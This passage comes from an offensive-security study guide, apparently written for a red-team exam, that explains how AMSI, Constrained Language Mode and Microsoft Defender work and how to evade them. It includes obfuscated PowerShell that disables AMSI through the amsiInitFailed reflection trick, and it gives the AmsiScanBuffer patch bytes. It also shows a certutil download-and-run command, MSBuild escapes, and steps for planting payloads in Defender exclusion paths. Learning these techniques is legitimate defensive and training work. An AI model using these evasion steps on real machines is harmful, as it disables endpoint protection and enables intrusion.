│                          │   content matches AMSI signatures         │
├──────────────────────────┼───────────────────────────────────────────┤
│  Office (WINWORD, EXCEL) │ VBA macro code before execution          │
│                          │ Triggered on macro run, not on file open  │
├──────────────────────────┼───────────────────────────────────────────┤
│  wmi (wmiprvse.exe)      │ WMI script content in some configurations │
├──────────────────────────┼───────────────────────────────────────────┤
│  JavaScript (Windows)    │ WSH (Windows Script Host) JavaScript      │
│                          │ Node.js is NOT scanned (not a WSH host)   │
└──────────────────────────┴───────────────────────────────────────────┘
```

**🔶 WHY**

The .NET CLR integration is the most important non-PowerShell context:

When your C2 beacon runs `execute-assembly`, the beacon process loads the .NET CLR, which calls `AmsiInitialize` and creates an AMSI context for that process. When `Assembly.Load(bytes)` is called, the CLR passes the assembly bytes to `AmsiScanBuffer` BEFORE loading the assembly.

This means: **AMSI can catch your SharpHound, Rubeus, or Seatbelt even when loaded via execute-assembly** — not just in PowerShell.

```
Sliver beacon runs execute-assembly with SharpHound.exe bytes
    ↓
Beacon's process loads CLR
    ↓
CLR calls AmsiInitialize for this process
    ↓
CLR calls AmsiScanBuffer(SharpHound_bytes, length)
    ↓
Defender's provider inspects the bytes
    ↓
If SharpHound has a known AMSI signature → BLOCKED
If not → ALLOWED → assembly loads and runs
```

**⚔️ HOW**

**This is why ETW patching matters alongside AMSI patching.** The complete evasion stack for in-memory .NET execution:

```
For PowerShell execution:
  1. AMSI bypass (Method 1, 2, or 3) → defeats AMSI content scan
  2. ETW patch (EtwEventWrite) → defeats assembly load event telemetry
  3. Script Block Logging disable → defeats PS logging

For C2 execute-assembly execution:
  1. C2 framework may patch AMSI in the beacon process before loading
     (Sliver does this automatically in some configurations)
  2. ETW patch in the beacon process → defeats assembly load telemetry
  3. Or: the beacon patches amsi.dll in its own process before calling Assembly.Load
```

Modern C2 frameworks handle this automatically, but understanding *why* they need to is critical when debugging failures.

---

## SECTION 9 — The AMSI Bypass Paradox: Why Bypasses Get Caught

**🔷 WHAT**

Here is the irony that trips up every beginner: **the AMSI bypass itself is scanned by AMSI before it can execute.**

```
You type the AmsiScanBuffer patch code into PowerShell:
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
         ↓
AMSI scans this line BEFORE it runs
         ↓
Defender's AMSI signatures include: "AmsiUtils" as a known-bad string
         ↓
BLOCKED: "This script contains malicious content"
         ↓
Your bypass never executes. AMSI defended itself.
```

This is the most common confusion: "I have an AMSI bypass but it gets caught by AMSI."

**🔶 WHY**

Microsoft specifically created AMSI signatures for all known AMSI bypass techniques. The strings `AmsiUtils`, `amsiInitFailed`, `AmsiScanBuffer`, `AmsiContext` are all signatured. The byte patterns of common patches (the `0xB8 0x57 0x00 0x07 0x80 0xC3` bytes) are signatured. Even the reflection path `GetType('System.Management.Automation.Am' + 'siUtils')` has variants signatured.

This creates a recursive defence: AMSI protects itself by scanning its own bypass attempts.

**⚔️ HOW**

**The solution is string obfuscation — break the strings AMSI is looking for:**

```powershell
# CAUGHT — the string "AmsiUtils" is signatured:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

# NOT CAUGHT — split the string so AMSI doesn't see it as one token:
$a = 'Amsi'
$b = 'Utils'
[Ref].Assembly.GetType("System.Management.Automation.$a$b")

# NOT CAUGHT — use variable substitution and encoding:
$x = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QW1zaVV0aWxz'))
[Ref].Assembly.GetType("System.Management.Automation.$x")

# NOT CAUGHT — build the field name dynamically:
$f = 'am' + 'si' + 'In' + 'it' + 'Fa' + 'il' + 'ed'
# Now use $f where you'd normally write 'amsiInitFailed'
```

**The principle**: AMSI scans the text content of what you type. If the text does not contain any signatured strings, the scan returns CLEAN, and the code executes. Once it executes, the variable values are resolved at runtime — by which point AMSI has already passed the content.

```
Timeline:
  1. You type obfuscated code → AMSI scans the TEXT → no match → CLEAN
  2. PowerShell executes the code → variables resolve → "AmsiUtils" is built at runtime
  3. The reflection call runs → amsiInitFailed is set to true
  4. All FUTURE commands skip AMSI entirely → mission accomplished
  
AMSI only sees step 1. Steps 2-4 happen AFTER the scan.
```

**Finding which strings trigger AMSI**: Use AMSITrigger or DefenderCheck (run from your Kali attacker machine, not from the target):

```bash
# AMSITrigger identifies exactly which strings trigger detection
# Run your bypass script through it to find the offending strings
# Then obfuscate ONLY those specific strings
```

**🧠 LOCK IT IN**

AMSI scanning your AMSI bypass is like a prison guard who searches everyone entering the prison — including the locksmith hired to change the locks. The locksmith (bypass code) has the tools to disable the guard (AMSI), but the guard searches the locksmith first. The solution: the locksmith comes in wearing a disguise (obfuscation) so the guard does not recognise them as a locksmith. Once inside, they disable the guard system — and from that point forward, no more searches.

---

## SECTION 10 — AMSI Return Values: The Complete Map

**🔷 WHAT**

AMSI does not return a simple yes/no. It returns a numeric result on a scale. Understanding the scale matters because different return values produce different PowerShell behaviors:

```
AMSI_RESULT Values (from amsi.h):
────────────────────────────────────────────────────────────
0       AMSI_RESULT_CLEAN           Content is clean
1       AMSI_RESULT_NOT_DETECTED    Nothing found (but not confirmed clean)
16384   AMSI_RESULT_BLOCKED_BY_ADMIN_START   Blocked by admin policy (range start)
20479   AMSI_RESULT_BLOCKED_BY_ADMIN_END     Blocked by admin policy (range end)
32768   AMSI_RESULT_DETECTED        Content is malicious

PowerShell's decision logic:
────────────────────────────────────────────────────────────
if (result >= AMSI_RESULT_DETECTED)   → BLOCK execution
if (result == AMSI_RESULT_CLEAN)      → ALLOW execution
if (result == AMSI_RESULT_NOT_DETECTED) → ALLOW execution
if (HRESULT == error)                 → ALLOW execution (graceful degradation)
```

**⚔️ HOW**

The memory patch forces AmsiScanBuffer to return an error HRESULT immediately:

```
AmsiScanBuffer original code (x64):
  First few bytes: various MOV and CMP instructions
  
After patching:
  B8 57 00 07 80    MOV EAX, 0x80070057     ← E_INVALIDARG error code
  C3                RET                       ← return immediately

What this does:
  → AmsiScanBuffer is called by PowerShell
  → Function immediately puts 0x80070057 in EAX (the return value register)
  → Function returns immediately without doing anything
  → PowerShell receives HRESULT = 0x80070057 (an error code)
  → PowerShell: "AMSI call failed" → graceful degradation → allows execution
  → The actual scan logic (provider calls, signature checking) NEVER RUNS
```

**Why E_INVALIDARG specifically**: The value `0x80070057` is the standard Windows error code for "an invalid argument was provided." PowerShell interprets this as "something went wrong with the AMSI call" rather than "the scan found something malicious." This distinction is critical — an error is treated differently from a DETECTED result.

---

## SECTION 11 — CLM + AMSI Together: The Compound Problem

**🔷 WHAT**

On a hardened machine, both CLM and AMSI are active simultaneously. This creates a compound problem where the bypass for one control is blocked by the other:

```
PROBLEM 1: AMSI bypass requires operations that CLM blocks
  → AMSI bypass Method 1 uses Add-Type → BLOCKED by CLM
  → AMSI bypass Method 2 uses reflection on internal types → BLOCKED by CLM
  → You cannot bypass AMSI from inside a CLM PowerShell session

PROBLEM 2: CLM bypass requires AMSI to be bypassed first
  → PS v2 downgrade might be caught by AMSI if done via script
  → MSBuild inline tasks might have AMSI scanning on the C# content
  → Invisi-Shell must be launched from OUTSIDE PowerShell

COMPOUND: CLM blocks AMSI bypass code. AMSI blocks CLM bypass scripts.
```

**🔶 WHY**

This is intentional defensive layering. Microsoft designed these controls to be mutually reinforcing:
- CLM prevents you from accessing the .NET types needed to patch AMSI
- AMSI prevents you from loading scripts that bypass CLM
- Together they create a much harder attack surface than either alone

**⚔️ HOW**

**The escape routes from the compound problem:**

```
ROUTE 1: Avoid both entirely — C2 execute-assembly
  → Your beacon is not PowerShell. Neither CLM nor PS AMSI apply.
  → The beacon process may have its own AMSI context (CLR-level),
     but the C2 framework handles patching it.
  → This is the cleanest path on the exam.

ROUTE 2: Invisi-Shell → launched from cmd.exe, not PowerShell
  → RunWithRegistryNonAdmin.bat is a CMD batch file
  → It sets registry keys and launches a NEW powershell.exe
  → The new PS session has AMSI disabled at CLR level
  → CLM may still be active (depends on AppLocker config)
  → If CLM is NOT active in the new session → full access

ROUTE 3: MSBuild/InstallUtil → compile C# outside PowerShell
  → Write bypass code in C# → compile via MSBuild
  → C# has full access to .NET framework — no CLM restrictions
  → Can patch AMSI from inside the C# code
  → Can then launch a new PowerShell session with AMSI already patched

ROUTE 4: Download and run a pre-compiled .NET binary
  → certutil.exe -urlcache -split -f http://ip/tool.exe tool.exe
  → tool.exe runs outside PowerShell → no CLM
  → tool.exe can patch AMSI in its own process if needed
  → This is "escape to a different execution context"
```

**Decision tree for the exam:**

```
Landed on a machine → opened PowerShell → ConstrainedLanguage detected
         ↓
Do I have a C2 beacon on this host?
  → YES: use execute-assembly for everything. Ignore PS entirely.
  → NO: I need to get my tools running without PS
         ↓
Can I download files? (certutil, bitsadmin, iwr still work in CLM for basic GET)
  → YES: download pre-compiled .NET tools, run directly from cmd.exe
  → NO: I need to use what's on the machine
         ↓
Is MSBuild available? (C:\Windows\Microsoft.NET\Framework64\...\MSBuild.exe)
  → YES: write a .csproj with inline C# → execute via MSBuild
  → NO: is PowerShell v2 available? → try downgrade
         ↓
None of the above:
  → Enumerate with basic cmdlets (Get-Process, Get-Service, whoami)
  → Transfer recon data to Kali → use Kali-based tools from there
  → Focus on getting C2 beacon deployed as top priority
```

**🧠 LOCK IT IN**

CLM + AMSI together is a room with two locks on the door. CLM is a deadbolt that prevents you from using your lockpick tools (offensive .NET types). AMSI is a guard dog that attacks anything that looks like a lockpick script. To get through both, you do not pick the lock at all — you go around the room entirely (C2 execute-assembly), enter through a window that has no locks (MSBuild), or find a back door that was built before the locks were installed (PS v2 downgrade).

---

---

# PART 3 — HOW WINDOWS DEFENDER ACTUALLY WORKS

---

## SECTION 12 — Defender Architecture Overview

**🔷 WHAT**

Windows Defender (now called Microsoft Defender Antivirus) is not a single program. It is a multi-layered architecture with components running at different levels of the operating system:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    WINDOWS DEFENDER ARCHITECTURE                        │
│                                                                         │
│  LAYER 1: USER-MODE SERVICE                                            │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  MsMpEng.exe — the Defender engine process                      │    │
│  │  • Runs as NT AUTHORITY\SYSTEM (highest privilege)              │    │
│  │  • Hosts the signature matching engine                          │    │
│  │  • Hosts the machine learning/heuristic engine                  │    │
│  │  • Communicates with cloud protection (MAPS)                    │    │
│  │  • Performs scheduled and on-demand scans                       │    │
│  │  • THIS is what uses CPU when "Defender is scanning"            │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                         │
│  LAYER 2: AMSI PROVIDER DLL (runs inside OTHER processes)              │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  MpOav.dll — loaded into PowerShell, Office, wscript, CLR      │    │
│  │  • Receives content from AmsiScanBuffer() calls                 │    │
│  │  • Forwards content to MsMpEng.exe for scanning                 │    │
│  │  • Returns CLEAN or DETECTED to the host application            │    │
│  │  • THIS is what blocks your PowerShell commands                 │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                         │
│  LAYER 3: FILESYSTEM MINIFILTER DRIVER (kernel mode)                   │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  WdFilter.sys — kernel-mode driver                              │    │
│  │  • Intercepts ALL file I/O operations at the kernel level       │    │
│  │  • Triggers a scan when a file is created, opened, or modified  │    │
│  │  • Runs BEFORE the application can access the file              │    │
│  │  • THIS is what blocks malware being written to disk            │    │
│  │  • Cannot be bypassed from user mode                            │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                         │
│  LAYER 4: NETWORK INSPECTION (kernel mode)                             │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  WdNisSvc.exe + WdNisDrv.sys                                   │    │
│  │  • Network Inspection System                                    │    │
│  │  • Inspects network traffic for known exploit patterns          │    │
│  │  • Operates at the network stack level                          │    │
│  │  • Separate from Windows Firewall                               │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                         │
│  LAYER 5: CLOUD PROTECTION (MAPS — Microsoft Active Protection Svc)   │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  When Defender is unsure about a file:                          │    │
│  │  → Computes file hash → sends to Microsoft cloud                │    │
│  │  → Cloud checks against global threat intelligence              │    │
│  │  → Cloud may request full file upload for analysis              │    │
│  │  → Cloud returns verdict in < 10 seconds                        │    │
│  │  → Can block zero-day malware before local signatures update    │    │
│  │  → THIS is why disconnected environments are easier to attack   │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                         │
│  LAYER 6: TAMPER PROTECTION                                            │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  Prevents disabling Defender via registry/GPO/PowerShell:       │    │
│  │  • Set-MpPreference -DisableRealtimeMonitoring $true → DENIED   │    │
│  │  • Modifying Defender registry keys → DENIED                    │    │
│  │  • Stopping the Defender service → DENIED                       │    │
│  │  • Even as SYSTEM / local admin                                 │    │
│  │  • Controlled by Microsoft 365 cloud policy, not local machine  │    │
│  │  • THIS is why "just disable Defender" doesn't work anymore     │    │
│  └─────────────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────────────┘
```

**🔶 WHY**

Each layer exists because attackers found ways around the previous layers:

```
History of escalation:
──────────────────────────────────────────────────────────────
EARLY: Defender was file-based only (Layer 3)
  → Attackers: "We'll just run everything in memory"
  → Microsoft added AMSI (Layer 2) to scan memory content

NEXT: Attackers bypass AMSI with memory patching
  → Microsoft added AMSI signature protection against bypass attempts
  → Microsoft added ETW telemetry as backup detection

NEXT: Attackers use novel malware not in signature DB
  → Microsoft added cloud protection (Layer 5)
  → Unknown files get analyzed in < 10 seconds

NEXT: Attackers disable Defender as admin
  → Microsoft added Tamper Protection (Layer 6)
  → Even admins cannot disable Defender locally

NEXT: Attackers use kernel-level techniques
  → Microsoft added kernel-mode drivers and PPL for MsMpEng
  → Defender itself runs as a protected process
```

**⚔️ HOW**

**As a red teamer, you need to know which layer you are fighting:**

```
Situation: Your payload is blocked when written to disk
  → You're fighting Layer 3 (WdFilter.sys — filesystem minifilter)
  → Solution: operate in memory only, or obfuscate the on-disk payload

Situation: Your PowerShell command is blocked
  → You're fighting Layer 2 (MpOav.dll — AMSI provider)
  → Solution: AMSI bypass (patch or obfuscation)

Situation: Your in-memory tool is blocked during execute-assembly
  → You're fighting Layer 2 (AMSI in .NET CLR context)
  → Solution: C2 framework's built-in AMSI patch, or manual ETW/AMSI patch

Situation: You disable Defender but it re-enables itself
  → You're fighting Layer 6 (Tamper Protection)
  → Solution: You cannot bypass this locally. Work AROUND Defender, not through it.

Situation: Your payload passes local scans but gets caught on execution
  → You're fighting Layer 5 (Cloud Protection / MAPS)
  → Possible in air-gapped or cloud-disconnected environments
  → In connected environments: your payload's hash is checked in real-time
```

**🧠 LOCK IT IN**

Defender is not one guard — it is six guards at six different posts:

Guard 1 (MsMpEng.exe) stands at the main gate, checking everyone's ID against a wanted list.
Guard 2 (MpOav.dll) is embedded inside each building, checking what people do inside.
Guard 3 (WdFilter.sys) monitors every delivery truck entering or leaving, inspecting packages.
Guard 4 (WdNisDrv.sys) monitors the phone lines and internet connections.
Guard 5 (MAPS cloud) calls headquarters when Guard 1 sees someone not on the list.
Guard 6 (Tamper Protection) watches the other guards — if someone tries to fire a guard, Guard 6 blocks it.

Patching AMSI disables Guard 2 in one building. The other five guards are still on duty.

---

## SECTION 13 — MsMpEng.exe: The Core Engine

**🔷 WHAT**

`MsMpEng.exe` is the main Defender process — the Malware Protection Engine. Everything Defender does (file scanning, AMSI analysis, cloud queries) flows through this process.

```
MsMpEng.exe details:
────────────────────────────────────────────────────────────
Path:     C:\ProgramData\Microsoft\Windows Defender\Platform\<version>\MsMpEng.exe
Runs as:  NT AUTHORITY\SYSTEM
Type:     Protected Process Light (PPL) — cannot be injected into or dumped
Parent:   services.exe (started by SCM)
CPU:      This process causes the "Defender using CPU" complaint
Memory:   Can use 500MB+ when doing a full scan
Threads:  Multiple scan threads run concurrently

Services it provides:
  WinDefend     — the main Defender service (cannot be stopped when Tamper Protection is on)
  WdNisSvc      — Network Inspection System service
```

**⚔️ HOW**

**Why MsMpEng matters operationally:**

```
1. Signature updates:
   → MsMpEng loads signature databases from:
     C:\ProgramData\Microsoft\Windows Defender\Definition Updates\
   → Signatures are mpavdlta.vdm (AV), mpasbase.vdm (AS), mpasdlta.vdm
   → Updated multiple times daily via Windows Update or MAPS
   → A payload that passed ThreatCheck today may fail tomorrow

2. Real-time protection flow:
   File created on disk → WdFilter.sys notifies MsMpEng → MsMpEng scans file
   → If match → file quarantined to:
     C:\ProgramData\Microsoft\Windows Defender\Quarantine\
   → Original file is replaced with a quarantine stub
   → Event logged: Event ID 1116 (detection), 1117 (action taken)

3. Exclusions — the attacker's best friend:
   → Defenders add exclusions for applications that trigger false positives
   → Common exclusions:
     - C:\ProgramData\ (many apps store data here)
     - *.log files
     - SQL Server data directories
     - IIS web directories
     - Specific process names (java.exe, node.exe)
   → Check exclusions:
     Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
     Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension
     Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess
   → If you can find an excluded path → write your payload there → Defender ignores it
   → NOTE: Viewing exclusions requires local admin
```

**🧠 LOCK IT IN**

MsMpEng.exe is the brain of Defender. Every other component (AMSI DLL, filesystem driver, network driver) is a sensor that feeds information to the brain. The brain makes the decision. If you trick a sensor (AMSI bypass), the brain never receives the information. If you find an exclusion, the brain deliberately ignores a specific input. Either way, the brain does not activate — but for different reasons.

---

## SECTION 14 — WdFilter.sys: The Filesystem Gatekeeper

**🔷 WHAT**

`WdFilter.sys` is a kernel-mode filesystem minifilter driver. This is the component that intercepts file operations in real time.

```
What is a minifilter driver?
────────────────────────────────────────────────────────────
Windows file system operations (create, read, write, delete) pass through a
stack of filter drivers before reaching the actual filesystem. A minifilter
driver can insert itself into this stack and inspect (or block) file operations.

Application calls CreateFile("C:\temp\payload.exe")
         ↓
I/O Manager sends the request down the filter stack
         ↓
WdFilter.sys intercepts the request
  → Reads the file content
  → Sends to MsMpEng.exe for analysis
  → If CLEAN: passes the request down to the filesystem
  → If DETECTED: blocks the request → application gets access denied
         ↓
NTFS.sys (actual filesystem) creates/reads the file
```

**🔶 WHY**

WdFilter.sys exists because file-based scanning needs to happen **before** the application accesses the file. Without a kernel-mode component, there would be a race condition:

```
Without minifilter (race condition):
  1. Application writes payload.exe to disk
  2. User-mode scanner detects payload.exe (takes 100ms to scan)
  3. During those 100ms, the application has already executed payload.exe
  → Malware runs before scanner can block it

With minifilter (no race condition):
  1. Application tries to write payload.exe
  2. WdFilter.sys intercepts at the kernel level BEFORE the write completes
  3. MsMpEng scans the content BEFORE the file appears on disk
  4. If malicious: write is blocked → file never exists → cannot be executed
  → Malware is stopped before it reaches the disk
```

**⚔️ HOW**

**This is why "fileless" attacks exist.** If WdFilter.sys scans everything written to disk, the attacker solution is: never write to disk.

```
Fileless execution chain:
  1. Payload delivered as base64 string (not a file)
  2. Decoded in memory (not written to disk)
  3. Loaded via Assembly.Load(bytes) or shellcode injection (in memory)
  4. Executes entirely in process memory
  5. WdFilter.sys never sees it — no file operation occurred
  6. BUT → AMSI may still catch it at step 3 (Assembly.Load triggers AMSI)

Partially fileless:
  1. Download payload to an EXCLUDED directory
  2. WdFilter.sys sees the write but MsMpEng skips scanning (exclusion)
  3. Payload executes from the excluded path
  4. This is why finding exclusions is valuable reconnaissance
```

**When WdFilter DOES catch fileless attacks:**

WdFilter monitors more than just traditional files. It also monitors:
- Memory-mapped files (some shellcode loaders use these)
- Alternate Data Streams (ADS)
- Named pipe operations (in some configurations)

**🧠 LOCK IT IN**

WdFilter.sys is a customs agent at the airport (disk). Every package (file) entering or leaving the airport is X-rayed (scanned). The agent sits physically inside the X-ray tunnel (kernel) — packages cannot pass through without being scanned. The fileless approach is smuggling goods by carrier pigeon (memory) instead of through the airport — the customs agent at the airport never sees them. But there is a second agent inside the building (AMSI) who inspects packages delivered by pigeon.

---

## SECTION 15 — Detection Mechanisms: Signatures, Heuristics, Behavior

**🔷 WHAT**

Defender does not use a single detection method. It layers three distinct approaches, and understanding which one caught your payload determines how to fix it:

### Detection Type 1: Signature-Based (Static)

```
How it works:
  → Defender maintains a database of byte patterns ("signatures")
  → When scanning a file or script, it checks for matches against these patterns
  → A match = detection

What signatures look for:
  → Specific byte sequences in the file (e.g., Mimikatz's PE header)
  → Specific strings (e.g., "Invoke-Mimikatz", "AmsiScanBuffer")
  → Specific hash values (SHA-256 of known malware)
  → Specific YARA-like rules (complex pattern matching)

Strengths:
  → Very fast (microseconds per scan)
  → Very accurate for KNOWN threats (near-zero false positives)
  → Works offline

Weaknesses:
  → Only detects KNOWN malware
  → Any modification to the payload can break the signature
  → Cat-and-mouse game: new signature → new obfuscation → new signature
```

**How to defeat signature detection:**

```
Tool: ThreatCheck (on your attacker machine, not the target)
  → ThreatCheck binary-searches your payload to find the exact bytes triggering detection
  → You then modify only those bytes
  → Recompile/rebuild → re-check with ThreatCheck → repeat until clean

Tool: DefenderCheck
  → Similar to ThreatCheck — identifies the exact offset of the detection

Techniques:
  → String replacement (change function names, variable names)
  → Recompilation with different compiler settings
  → Code refactoring (same logic, different byte sequence)
  → Packing/encryption (encode the payload, decode at runtime)
```

### Detection Type 2: Heuristic-Based (Static Analysis)

```
How it works:
  → Defender analyzes the STRUCTURE of a file, not just byte patterns
  → Looks for suspicious characteristics:
    - High entropy sections (encrypted/packed content)
    - Suspicious imports (VirtualAlloc + WriteProcessMemory + CreateRemoteThread)
    - PE anomalies (mismatched section sizes, unusual entry points)
    - Known packer signatures (UPX, Themida headers)

Strengths:
  → Can detect modified versions of known malware
  → Catches "reskinned" malware that changed surface-level strings

Weaknesses:
  → Higher false positive rate than signatures
  → Can be fooled by legitimate-looking PE structures
  → Entropy checks can be defeated by adding padding/junk data
```

### Detection Type 3: Behavioral-Based (Dynamic/Runtime)

```
How it works:
  → Defender monitors what a process DOES after it starts running
  → Suspicious behavior chains trigger detection:
    - Process creates remote thread in another process → suspicious
    - Process reads LSASS memory → very suspicious
    - Process modifies AMSI-related memory → extremely suspicious
    - Process spawns cmd.exe/powershell.exe from Office application → suspicious
    - Process creates service for persistence → noted

Strengths:
  → Catches threats that pass signature and heuristic checks
  → Detects novel malware based on what it does, not what it looks like
  → Very hard to defeat without changing attack methodology

Weaknesses:
  → Only triggers after the malware starts running
  → Some legitimate software triggers behavioral alerts (false positives)
  → Can be evaded by changing HOW you perform actions (different API calls,
    different injection techniques)
```

**⚔️ HOW**

**Which detection type caught you — the diagnostic:**

```
Your file is blocked BEFORE execution (on write to disk or on scan):
  → Signature or heuristic detection
  → Fix: ThreatCheck → find and modify triggering bytes
  → Fix: Recompile with different settings, change strings

Your file passes static scan but is blocked DURING execution:
  → Behavioral detection
  → Fix: Change the technique itself (different injection method,
    different API calls, different process to inject into)
  → Fix: Use indirect syscalls instead of direct API calls
  → Fix: Unhook ntdll to remove Defender's behavioral hooks

Your file passes local scan but is blocked within 10 seconds:
  → Cloud protection (MAPS)
  → The file hash was sent to Microsoft's cloud for analysis
  → Fix: Change the file content (even a single byte changes the hash)
  → Fix: Test in an air-gapped VM to separate local vs cloud detection
```

**🧠 LOCK IT IN**

```
Three detection methods = three types of police work:

Signature = wanted poster
  → "This exact face (byte pattern) is wanted"
  → Defeated by a disguise (obfuscation)

Heuristic = profiling
  → "This person is wearing a balaclava, gloves, and carrying a crowbar
     at 3am near a jewelry store"
  → Defeated by dressing normally (legitimate-looking PE structure)

Behavioral = surveillance
  → "This person entered the store, disabled the alarm, opened the safe"
  → Can only be detected AFTER the crime starts
  → Defeated by using a different method entirely (a different attack technique)
```

---

## SECTION 16 — Defender Exclusions: The Red Team Gold Mine

**🔷 WHAT**

Exclusions are paths, extensions, or processes that Defender is configured to skip during scanning. They exist because legitimate software sometimes triggers false positives or suffers performance degradation from scanning.

```
Types of exclusions:
────────────────────────────────────────────────────────────
Path exclusions:        Specific folders Defender won't scan
  → C:\ProgramData\SomeApp\
  → D:\SQLData\
  → \\server\share\logs\

Extension exclusions:   File types Defender won't scan
  → .log, .bak, .tmp
  → .mdf, .ldf (SQL databases)

Process exclusions:     Processes whose file operations Defender won't scan
  → java.exe (prevents scanning every .class file)
  → sqlservr.exe (prevents scanning database writes)
  → w3wp.exe (IIS worker — prevents scanning web content)
```

**⚔️ HOW**

**Enumerating exclusions (requires local admin):**

```powershell
# PowerShell — requires admin
Get-MpPreference | Select-Object -Property Exclusion*

# Specific exclusion types:
(Get-MpPreference).ExclusionPath
(Get-MpPreference).ExclusionExtension
(Get-MpPreference).ExclusionProcess

# Registry — if PS is restricted:
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions"
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"
```

**Abusing exclusions:**

```
Scenario: Exclusion path = C:\ProgramData\AppName\

  1. You discover this exclusion via Get-MpPreference
  2. Copy your payload to: C:\ProgramData\AppName\payload.exe
  3. WdFilter.sys sees the write → checks exclusion list → SKIP
  4. Payload is on disk but Defender never scans it
  5. Execute payload from excluded path → runs freely

Scenario: Process exclusion = java.exe

  1. Your beacon uses process hollowing into java.exe
  2. Defender skips scanning file operations by java.exe processes
  3. Your beacon (masquerading as java.exe) can write to disk freely
  4. Note: AMSI may still apply if the content triggers script scanning
```

**Common exclusions to look for in enterprise environments:**

```
SQL Server:
  C:\Program Files\Microsoft SQL Server\...
  *.mdf, *.ldf, *.ndf

IIS:
  C:\inetpub\wwwroot\
  Process: w3wp.exe

Exchange:
  C:\Program Files\Microsoft\Exchange Server\...
  Many extensions excluded for performance

Development:
  C:\Users\*\source\repos\
  Process: devenv.exe, dotnet.exe

Backup software:
  C:\Backups\
  Process: veeam*.exe, backup*.exe
```

**🧠 LOCK IT IN**

Exclusions are VIP passes. If you arrive at the security checkpoint (WdFilter.sys) with a VIP pass (your payload is in an excluded path), the guard waves you through without inspection. Finding an exclusion is finding a dropped VIP pass on the ground — it gets you past the checkpoint without any disguise.

---

## SECTION 17 — Tamper Protection: Why You Can't Just Turn Defender Off

**🔷 WHAT**

Tamper Protection prevents anyone — including local administrators and SYSTEM — from disabling Defender through local means. It was introduced because the most common "bypass" was simply turning Defender off.

```
What Tamper Protection blocks:
────────────────────────────────────────────────────────────
These commands ALL FAIL when Tamper Protection is ON:

Set-MpPreference -DisableRealtimeMonitoring $true
  → Access Denied

sc stop WinDefend
  → Access Denied

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1
  → Access Denied (change is silently reverted)

Kill MsMpEng.exe process
  → Access Denied (PPL protected)

GPO: "Turn off Windows Defender Antivirus"
  → Policy is ignored when Tamper Protection is cloud-managed

Even with SYSTEM privileges:
  → None of the above work
  → Tamper Protection is enforced at the cloud level
  → Only Microsoft 365 Defender admin portal can disable it
```

**🔶 WHY**

Before Tamper Protection, the standard attack pattern was:

```
1. Get local admin / SYSTEM
2. Set-MpPreference -DisableRealtimeMonitoring $true
3. Download and run anything freely
4. Re-enable Defender before leaving (or don't)
```

This made all of Defender's detection capabilities irrelevant once the attacker had admin. Tamper Protection closed this gap by removing the ability to disable Defender locally.

**⚔️ HOW**

**What you can still do even with Tamper Protection ON:**

```
✅ AMSI bypass (in-process patching of amsi.dll)
  → Tamper Protection protects MsMpEng.exe and WdFilter.sys
  → It does NOT protect amsi.dll loaded in YOUR process (PowerShell)
  → You can still patch AmsiScanBuffer in your own process space
  → This is a critical distinction

✅ Add exclusions (if you have admin)
  → Tamper Protection blocks REMOVING exclusions, not adding them
  → You can add a path exclusion and write your payload there
  → Note: This varies — some Tamper Protection configurations block this

✅ Fileless execution
  → Tamper Protection keeps WdFilter scanning, but fileless payloads
    never touch disk → WdFilter is irrelevant

✅ ETW patching
  → Same principle as AMSI — ETW patches happen in your own process

❌ Cannot stop Defender service
❌ Cannot disable real-time protection
❌ Cannot kill MsMpEng.exe
❌ Cannot remove existing exclusions (in strict configurations)
❌ Cannot modify Defender's configuration keys in the registry
```

**🧠 LOCK IT IN**

Tamper Protection is a rule that says "nobody can fire the security guards." Before Tamper Protection, getting admin was like becoming the building owner — you could fire all the guards (disable Defender). Now, even as the building owner, a corporate policy (cloud management) prevents you from dismissing the guards. You can still sneak things past the guards (AMSI bypass, fileless), but you cannot remove the guards themselves. The guards' employer (Microsoft cloud) is the only one who can reassign them.

---

## SECTION 18 — Bringing It All Together: The Complete Evasion Mental Model

**🔷 WHAT**

When you land on a hardened Windows machine, you face up to four simultaneous defenses. The order in which you address them matters:

```
STEP 1: What's running? What's blocking me?
────────────────────────────────────────────────────────────
# Check Defender status
Get-MpComputerStatus | Select-Object -Property *Enabled, *Running
# Check language mode
$ExecutionContext.SessionState.LanguageMode
# Check for other AV
Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntivirusProduct
# Check AppLocker
Get-AppLockerPolicy -Effective
# Check WDAC
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

STEP 2: Decision tree
────────────────────────────────────────────────────────────
Is CLM active?
  → YES + I have C2 beacon: use execute-assembly for everything
  → YES + no beacon: MSBuild/InstallUtil for custom code, basic cmdlets for recon
  → NO: proceed to AMSI bypass in PowerShell

Is AMSI active?
  → YES + FullLanguage: run obfuscated AMSI bypass → then load tools
  → YES + CLM: must escape to non-PS execution first (see above)
  → NO (already bypassed or not present): load tools freely

Is Defender real-time scanning ON?
  → YES + Tamper Protection: work AROUND it (fileless, exclusions, obfuscation)
  → YES + no Tamper: disable if you have admin (rare in modern environments)
  → NO: write to disk freely (uncommon scenario)

Is cloud protection (MAPS) active?
